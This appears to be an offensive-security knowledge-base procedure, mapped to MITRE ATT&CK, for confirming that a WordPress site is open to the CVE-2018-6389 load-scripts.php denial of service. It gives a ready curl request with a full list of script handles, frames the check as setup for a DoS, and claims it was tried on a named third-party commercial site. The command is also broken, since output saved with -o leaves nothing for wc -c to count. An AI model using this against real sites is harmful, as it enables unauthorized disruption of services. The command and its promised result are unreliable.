---
tags:
  - dos
  - verification
  - wordpress
type: procedure
tools: []
tactics:
  - '[[Reconnaissance]]'
commands:
  - '[[commands/curl-load-scripts-dos]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:26:55.854Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 4470014f-9a8f-4e4e-9a42-9aa053a90fd5
validated: true
mitre_tactics:
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Verify-Load-Scripts-Endpoint-on-Target

## Summary

This procedure verifies if a target WordPress site is vulnerable to CVE-2018-6389 by sending a request to the /wp-admin/load-scripts.php endpoint with a comprehensive 'load' parameter, checking for large response generation without authentication.

## Description

The endpoint concatenates multiple JavaScript files based on the 'load' parameter, producing responses up to ~3MB if no protections are in place. This step confirms accessibility and lack of rate-limiting or auth, setting up for DoS simulation. Tested on sites like nordvpn.com, it reveals resource-intensive behavior exploitable by unauthenticated attackers.

## Requirements

1. Target URL accessible via HTTP/HTTPS
2. List of WordPress script handles from research
3. curl or similar HTTP client installed

## Defense

Defensive measures and detection strategies:

- Disable or restrict access to /wp-admin/load-scripts.php for unauthenticated users
- Apply rate-limiting on admin endpoints using nginx or mod_security
- Log and alert on requests with large 'load' parameters

## Objectives

1. Confirm endpoint exposure and vulnerability
2. Measure response size to gauge impact potential
3. Validate no authentication or protections

## Instructions

### Step 1: Construct Payload

**Context**: Build the 'load' parameter with numerous script handles to trigger concatenation.

Use handles like: eutil,common,jquery,thickbox,shortcode,media-upload,svg-painter,jquery-ui-core,jquery-ui-widget,jquery-ui-button,jquery-ui-slider,jquery-ui-mouse,jquery-ui-dialog.

### Step 2: Send Verification Request

**Context**: Execute an HTTP GET request to the endpoint and measure response size.

**Command** ([[commands/curl-load-scripts-dos]]):
```bash
curl -s -o response.js "https://target.com/wp-admin/load-scripts.php?load=eutil,common,jquery,thickbox,shortcode,media-upload,svg-painter,jquery-ui-core,jquery-ui-widget,jquery-ui-button,jquery-ui-slider,jquery-ui-mouse,jquery-ui-dialog" | wc -c
```

> This downloads the response to response.js and outputs its byte size. Expect ~3MB (around 3,000,000 bytes) if vulnerable.

**Expected Output**: Large file size confirming vulnerability.

## MITRE ATT&CK Mapping

### Tactics

- [[Reconnaissance]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-load-scripts-dos]]

## Tools Used


## Tags

- [[dos]]
- [[verification]]
